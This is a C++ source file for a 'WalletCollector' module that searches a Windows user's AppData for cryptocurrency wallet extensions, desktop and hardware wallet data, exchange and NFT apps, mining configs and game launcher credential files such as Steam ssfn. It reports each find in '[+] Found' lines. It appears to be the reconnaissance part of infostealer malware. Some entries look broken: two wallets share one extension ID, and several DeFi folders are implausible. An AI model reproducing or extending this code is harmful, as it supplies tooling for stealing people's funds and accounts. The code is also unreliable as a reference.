#include "wallet_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <iostream>
#include <sstream>
#include <filesystem>

std::string WalletCollector::CollectAllWallets() {
    std::string result;
    
    char localPath[MAX_PATH], roamingPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localPath);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, roamingPath);
    
    result += CollectBrowserWallets(localPath);
    result += CollectDesktopWallets(roamingPath);
    result += CollectExchangeApps(roamingPath);
    result += CollectHardwareWallets(roamingPath);
    result += CollectDeFiWallets(roamingPath);
    result += CollectGamingWallets(roamingPath, localPath);
    result += CollectMiningSoftware(roamingPath);
    result += CollectNFTPlatforms(roamingPath);
    
    return result;
}

std::string WalletCollector::CollectBrowserWallets(const std::string& localPath) {
    std::string result;
    
    std::vector<std::pair<std::string, std::string>> wallets = {
        {"MetaMask", localPath + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
        {"Phantom", localPath + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
        {"TronLink", localPath + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},
        {"Coinbase Wallet", localPath + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},
        {"Binance Wallet", localPath + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
        {"Trust Wallet", localPath + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"},
        {"Ronin Wallet", localPath + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"},
        {"Math Wallet", localPath + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},
        {"Sollet", localPath + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},
        {"Solflare", localPath + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},
    };
    
    for (const auto& wallet : wallets) {
        if (PathFileExistsA(wallet.second.c_str())) {
            result += "[+] Found Browser Wallet: " + wallet.first + "\n";
        }
    }
    
    return result;
}

std::string WalletCollector::CollectDesktopWallets(const std::string& roamingPath) {
    std::string result;
    
    std::vector<std::pair<std::string, std::string>> wallets = {
        {"Exodus", roamingPath + "\\Exodus\\exodus.wallet"},
        {"Electrum", roamingPath + "\\Electrum\\wallets"},
        {"Atomic Wallet", roamingPath + "\\atomic\\Local Storage\\leveldb"},
        {"Jaxx Liberty", roamingPath + "\\com.liberty.jaxx\\IndexedDB"},
        {"Coinomi", roamingPath + "\\Coinomi\\Coinomi\\wallets"},
        {"Guarda", roamingPath + "\\Guarda\\Local Storage\\leveldb"},
        {"BitPay", roamingPath + "\\BitPay\\wallets"},
        {"WalletWasabi", roamingPath + "\\WalletWasabi\\Client\\Wallets"},
        {"Armory", roamingPath + "\\Armory\\wallets"},
        {"MultiBit", roamingPath + "\\MultiBit\\multibit.wallet"},
        {"Bisq", roamingPath + "\\Bisq\\btc_mainnet\\wallet"},
        {"MyEtherWallet", roamingPath + "\\MyEtherWallet\\Local Storage\\leveldb"},
        {"Daedalus", roamingPath + "\\Daedalus\\wallets"},
        {"Yoroi", roamingPath + "\\Yoroi\\wallets"},
        {"Nami", roamingPath + "\\Nami\\wallets"},
        {"Eternl", roamingPath + "\\Eternl\\wallets"},
    };
    
    for (const auto& wallet : wallets) {
        if (PathFileExistsA(wallet.second.c_str())) {
            result += "[+] Found Desktop Wallet: " + wallet.first + "\n";
        }
    }
    
    return result;
}

std::string WalletCollector::CollectExchangeApps(const std::string& roamingPath) {
    std::string result;
    
    std::vector<std::pair<std::string, std::string>> exchanges = {
        {"Binance", roamingPath + "\\Binance\\Local Storage\\leveldb"},
        {"Coinbase", roamingPath + "\\Coinbase\\Local Storage\\leveldb"},
        {"Kraken", roamingPath + "\\Kraken\\Local Storage\\leveldb"},
        {"KuCoin", roamingPath + "\\KuCoin\\Local Storage\\leveldb"},
        {"Huobi", roamingPath + "\\Huobi\\Local Storage\\leveldb"},
        {"OKEx", roamingPath + "\\OKEx\\Local Storage\\leveldb"},
        {"Gate.io", roamingPath + "\\Gate.io\\Local Storage\\leveldb"},
        {"Bitfinex", roamingPath + "\\Bitfinex\\Local Storage\\leveldb"},
        {"Gemini", roamingPath + "\\Gemini\\Local Storage\\leveldb"},
        {"Bitstamp", roamingPath + "\\Bitstamp\\Local Storage\\leveldb"},
    };
    
    for (const auto& exchange : exchanges) {
        if (PathFileExistsA(exchange.second.c_str())) {
            result += "[+] Found Exchange: " + exchange.first + "\n";
        }
    }
    
    return result;
}

std::string WalletCollector::CollectHardwareWallets(const std::string& roamingPath) {
    std::string result;
    
    std::vector<std::pair<std::string, std::string>> wallets = {
        {"Ledger Live", roamingPath + "\\Ledger Live\\Local Storage\\leveldb"},
        {"Trezor Suite", roamingPath + "\\TrezorSuite\\Local Storage\\leveldb"},
        {"MyTrezor", roamingPath + "\\MyTrezor\\wallets"},
        {"Ledger Bridge", roamingPath + "\\LedgerBridge\\Local Storage\\leveldb"},
    };
    
    for (const auto& wallet : wallets) {
        if (PathFileExistsA(wallet.second.c_str())) {
            result += "[+] Found Hardware Wallet Software: " + wallet.first + "\n";
        }
    }
    
    return result;
}

std::string WalletCollector::CollectDeFiWallets(const std::string& roamingPath) {
    std::string result;
    
    std::vector<std::pair<std::string, std::string>> wallets = {
        {"Uniswap", roamingPath + "\\Uniswap\\Local Storage\\leveldb"},
        {"PancakeSwap", roamingPath + "\\PancakeSwap\\Local Storage\\leveldb"},
        {"SushiSwap", roamingPath + "\\SushiSwap\\Local Storage\\leveldb"},
        {"1inch", roamingPath + "\\1inch\\Local Storage\\leveldb"},
        {"Curve", roamingPath + "\\Curve\\Local Storage\\leveldb"},
        {"Balancer", roamingPath + "\\Balancer\\Local Storage\\leveldb"},
        {"Compound", roamingPath + "\\Compound\\Local Storage\\leveldb"},
        {"Aave", roamingPath + "\\Aave\\Local Storage\\leveldb"},
        {"MakerDAO", roamingPath + "\\MakerDAO\\Local Storage\\leveldb"},
        {"Yearn", roamingPath + "\\Yearn\\Local Storage\\leveldb"},
    };
    
    for (const auto& wallet : wallets) {
        if (PathFileExistsA(wallet.second.c_str())) {
            result += "[+] Found DeFi Wallet: " + wallet.first + "\n";
        }
    }
    
    return result;
}

std::string WalletCollector::CollectGamingWallets(const std::string& roamingPath, const std::string& localPath) {
    std::string result;
    
    std::vector<std::pair<std::string, std::string>> games = {
        {"Steam", roamingPath + "\\Steam\\ssfn"},
        {"Origin", roamingPath + "\\Origin\\EntitlementCache"},
        {"Uplay", localPath + "\\Ubisoft Game Launcher\\settings"},
        {"Epic Games", localPath + "\\EpicGamesLauncher\\Saved\\Config"},
        {"Battle.net", roamingPath + "\\Battle.net"},
        {"GOG Galaxy", localPath + "\\GOG.com\\Galaxy\\Configuration"},
        {"Rockstar Games", localPath + "\\Rockstar Games\\Launcher"},
    };
    
    for (const auto& game : games) {
        if (PathFileExistsA(game.second.c_str())) {
            result += "[+] Found Game Platform: " + game.first + "\n";
        }
    }
    
    return result;
}

std::string WalletCollector::CollectMiningSoftware(const std::string& roamingPath) {
    std::string result;
    
    std::vector<std::pair<std::string, std::string>> miners = {
        {"NiceHash Miner", roamingPath + "\\NiceHash Miner\\configs"},
        {"Claymore", roamingPath + "\\Claymore\\wallets"},
        {"PhoenixMiner", roamingPath + "\\PhoenixMiner\\wallets"},
        {"T-Rex", roamingPath + "\\T-Rex\\configs"},
        {"TeamRedMiner", roamingPath + "\\TeamRedMiner\\configs"},
        {"Gminer", roamingPath + "\\Gminer\\configs"},
        {"NBMiner", roamingPath + "\\NBMiner\\configs"},
        {"lolMiner", roamingPath + "\\lolMiner\\configs"},
    };
    
    for (const auto& miner : miners) {
        if (PathFileExistsA(miner.second.c_str())) {
            result += "[+] Found Mining Software: " + miner.first + "\n";
        }
    }
    
    return result;
}

std::string WalletCollector::CollectNFTPlatforms(const std::string& roamingPath) {
    std::string result;
    
    std::vector<std::pair<std::string, std::string>> platforms = {
        {"OpenSea", roamingPath + "\\OpenSea\\Local Storage\\leveldb"},
        {"Rarible", roamingPath + "\\Rarible\\Local Storage\\leveldb"},
        {"SuperRare", roamingPath + "\\SuperRare\\Local Storage\\leveldb"},
        {"Foundation", roamingPath + "\\Foundation\\Local Storage\\leveldb"},
        {"AsyncArt", roamingPath + "\\AsyncArt\\Local Storage\\leveldb"},
        {"KnownOrigin", roamingPath + "\\KnownOrigin\\Local Storage\\leveldb"},
        {"MakersPlace", roamingPath + "\\MakersPlace\\Local Storage\\leveldb"},
        {"Nifty Gateway", roamingPath + "\\NiftyGateway\\Local Storage\\leveldb"},
    };
    
    for (const auto& platform : platforms) {
        if (PathFileExistsA(platform.second.c_str())) {
            result += "[+] Found NFT Platform: " + platform.first + "\n";
        }
    }
    
    return result;
}
